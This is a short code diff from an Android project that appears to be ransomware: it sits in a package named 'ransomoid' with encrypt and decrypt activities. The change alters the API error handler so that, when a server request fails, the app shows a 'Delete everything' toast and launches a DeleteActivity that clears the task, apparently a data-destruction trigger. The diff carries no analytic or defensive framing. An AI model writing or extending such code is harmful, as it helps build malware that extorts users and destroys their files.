@@ -12,6 +12,7 @@ import com.android.volley.toolbox.Volley;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import falezza.fabio.ransomoid.activities.DeleteActivity;
 import falezza.fabio.ransomoid.activities.DecryptActivity;
 import falezza.fabio.ransomoid.activities.EncryptedActivity;
 
@@ -88,8 +89,10 @@ public class Api {
         Response.ErrorListener errorListener = new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-                System.out.println(error);
                 Toast.makeText(ctx, "Delete everything", Toast.LENGTH_SHORT).show();
+                Intent deleteActivity = new Intent(ctx, DeleteActivity.class);
+                deleteActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+                ctx.startActivity(deleteActivity);
             }
         };
 
